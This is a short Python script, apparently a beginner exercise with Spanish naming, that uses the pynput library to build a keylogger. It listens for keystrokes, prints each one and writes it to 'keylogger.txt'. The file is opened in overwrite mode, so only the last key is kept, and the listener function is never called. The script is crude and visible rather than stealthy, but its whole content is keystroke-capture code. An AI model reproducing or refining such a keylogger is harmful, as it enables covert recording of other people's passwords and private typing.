from pynput import keyboard as kb

def pulsa(tecla):
	print('Se ha pulsado la tecla ' + str(tecla))
	file(tecla)
def file(letra):
	file=open("keylogger.txt", "w")
	file.write(str(letra))
	file.close()
def get_Click_In_Keyboard():
	with kb.Listener(pulsa) as listener:
		listener.join()

